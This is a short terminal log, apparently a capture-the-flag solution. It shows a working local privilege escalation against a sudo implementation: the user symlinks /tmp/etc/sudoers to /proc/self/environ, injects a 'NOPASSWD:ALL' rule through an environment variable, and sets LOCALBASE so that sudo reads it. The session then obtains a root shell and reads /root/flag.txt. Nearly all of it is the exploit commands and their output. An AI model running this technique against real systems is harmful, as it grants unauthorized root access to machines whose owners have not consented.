user@f92216e0886f:~$ mkdir /tmp/etc/
user@f92216e0886f:~$ ln -s /proc/self/environ /tmp/etc/sudoers
user@f92216e0886f:~$ hax='
> user ALL=(ALL) NOPASSWD:ALL
> ' LOCALBASE=/tmp/ sudo sh
/tmp/etc/sudoers:1:4: expected host name
hax=
   ^
/tmp/etc/sudoers:3:1: garbage at end of line
LOCALBASE=/tmp/HOSTNAME=f92216e0886fPWD=/home/userHOME=/home/user<...>RUST_VERSION=1.87.0PATH=/usr/local/cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/bin/sudo
^
# cat /root/flag.txt
skbdg{s0_much_34s13r_70_r34d_7h4n_c}
